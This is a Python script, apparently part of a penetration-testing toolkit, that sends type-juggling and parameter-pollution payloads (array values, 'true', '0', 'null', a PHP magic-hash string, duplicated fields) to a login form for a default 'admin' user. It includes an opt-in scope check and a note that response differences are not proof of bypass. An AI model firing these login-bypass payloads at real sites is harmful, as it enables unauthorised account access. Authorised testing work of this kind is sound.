#!/usr/bin/env python3
"""Parameter/type-juggling probe: form type confusion + HPP, no brute force."""
from __future__ import annotations

import argparse
import hashlib
import json
import ssl
import time
import urllib.parse
import urllib.request
from pathlib import Path

from scope_lint import host_of, load_scope, matches

CASES = Path("/root/cases")


def post(url: str, pairs: list[tuple[str, str]], timeout: float, insecure: bool) -> dict:
    data = urllib.parse.urlencode(pairs, doseq=True).encode()
    req = urllib.request.Request(url, data=data, method="POST",
                                 headers={"Content-Type": "application/x-www-form-urlencoded",
                                          "User-Agent": "Mozilla/5.0"})
    ctx = ssl._create_unverified_context() if insecure else None
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read(4096)
            return {"status": r.status, "len": len(body), "sha": hashlib.sha256(body).hexdigest()[:12],
                    "snippet": body[:200].decode("utf-8", errors="replace")}
    except Exception as e:
        return {"error": f"{type(e).__name__}: {e}"}


def main() -> int:
    ap = argparse.ArgumentParser(description="类型混淆/参数污染探针")
    ap.add_argument("action", choices=["juggl"], nargs="?", default="juggl")
    ap.add_argument("--url", "-u", required=True)
    ap.add_argument("--user", default="admin")
    ap.add_argument("--user-param", default="username")
    ap.add_argument("--param", default="password")
    ap.add_argument("--case", "-c")
    ap.add_argument("--timeout", type=float, default=10)
    ap.add_argument("--delay", type=float, default=0.4)
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--scope", help="authorized domain/glob; mismatch fails closed")
    args = ap.parse_args()

    if args.scope:
        host = host_of(args.url)
        entries = load_scope(None, [args.scope])
        if not any(matches(host, e)[0] for e in entries):
            print(f"[scope] DENY {host} not in {args.scope}", flush=True)
            return 2

    payloads = [
        ("array", [(args.user_param, args.user), (args.param + "[]", "x")]),
        ("true", [(args.user_param, args.user), (args.param, "true")]),
        ("zero", [(args.user_param, args.user), (args.param, "0")]),
        ("null", [(args.user_param, args.user), (args.param, "null")]),
        ("magic", [(args.user_param, args.user), (args.param, "0e00000000000000000000000000000000")]),
        ("hpp2", [(args.user_param, args.user), (args.param, "x"), (args.param, "y")]),
    ]
    results = []
    for name, pairs in payloads:
        r = post(args.url, pairs, args.timeout, args.insecure)
        r["probe"] = name
        results.append(r)
        print(f"{name:8} status={r.get('status','ERR')} len={r.get('len','-')} sha={r.get('sha','-')} {r.get('error','')}")
        time.sleep(max(0.0, args.delay))
    if args.case:
        case = Path(args.case) if Path(args.case).is_absolute() else CASES / args.case
        (case / "artifacts").mkdir(parents=True, exist_ok=True)
        out = case / "artifacts/param_abuse.json"
        out.write_text(json.dumps({"url": args.url, "results": results}, ensure_ascii=False, indent=2), encoding="utf-8")
        print(f"[case] {out}")
    print("[note] 差异只说明行为变化，不等于认证绕过；需用业务响应做二次确认")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
